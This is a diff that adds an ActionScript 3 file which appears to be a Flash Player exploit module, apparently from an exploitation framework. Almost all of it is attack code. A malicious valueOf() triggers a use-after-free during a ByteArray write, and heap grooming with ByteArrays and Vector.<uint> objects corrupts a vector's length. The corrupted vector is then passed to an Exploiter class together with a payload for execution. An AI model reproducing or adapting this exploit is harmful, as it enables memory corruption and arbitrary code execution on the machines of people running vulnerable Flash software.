@@ -1,0 +1,98 @@
+﻿package
+{
+	import flash.display.DisplayObjectContainer;
+	import flash.utils.ByteArray;
+	import flash.system.Capabilities;
+	import flash.events.MouseEvent;
+	import flash.external.ExternalInterface;
+	
+	public class MyClass
+	{
+		static var 
+			_gc:Array, 
+			_va:Array,
+			_ba:ByteArray,
+			_corrupted:Vector.<uint>,
+			_isDbg:Boolean = Capabilities.isDebugger;
+		
+		// define malicious valueOf()
+		prototype.valueOf = function ()
+		{
+			Logger.log("MyClass.valueOf()");
+			
+			_va = new Array(5);
+			_gc.push(_va); // protect from GC // for RnD
+			
+			// reallocate _ba storage
+			_ba.length = 0x1100;
+			
+			// reuse freed memory
+			for(var i:int; i < _va.length; i++)
+				_va[i] = new Vector.<uint>(0x3f0);
+			
+			// return one byte for overwriting
+			return 0x40;
+		}
+		
+		// try to corrupt the length value of Vector.<uint>
+		static function TryExpl(e:Exploit, platform:String, payload:ByteArray) : Boolean
+		{
+            Logger.log("tryexpl")
+			try
+			{
+				var alen:int = 90; // should be multiply of 3
+				var a = new Array(alen);
+				if (_gc == null) _gc = new Array();
+				_gc.push(a); // protect from GC // for RnD
+				
+				// try to allocate two sequential pages of memory: [ ByteArray ][ MyClass2 ]
+				for(var i:int; i < alen; i+=3){
+					a[i] = new MyClass2(i);
+					
+					a[i+1] = new ByteArray();
+					a[i+1].length = 0xfa0;
+					
+					a[i+2] = new MyClass2(i+2);
+				}
+				
+				// find these pages
+				for(i=alen-5; i >= 0; i-=3)
+				{
+					// take next allocated ByteArray
+					_ba = a[i];
+					// call valueOf() and cause UaF memory corruption 
+					_ba[3] = new MyClass();
+					// _ba[3] should be unchanged 0
+					Logger.log("_ba[3] = " + _ba[3]);
+					if (_ba[3] != 0) throw new Error("can't cause UaF");
+					
+					// check results // find corrupted vector
+					for (var j:int = 0; j < _va.length; j++) {	
+						if (_va[j].length != 0x3f0) {
+							_corrupted = _va[j]
+						} else {
+							delete(_va[j])
+							_va[j] = null
+						}
+					}
+					
+					if (_corrupted != null) {
+						Logger.log("_corrupted.length = 0x" + _corrupted.length.toString(16));
+						var exploiter:Exploiter = new Exploiter(e, platform, payload,_corrupted, 0x3f0)
+						Logger.log("_corrupted.length = 0x" + _corrupted.length.toString(16));
+						return true
+					}
+				}
+				Logger.log("bad allocation. try again."); 
+			}
+			catch (e:Error) 
+			{
+				Logger.log("TryExpl() " + e.toString());
+			}
+			
+			return false;
+		}
+		
+	}
+
+}
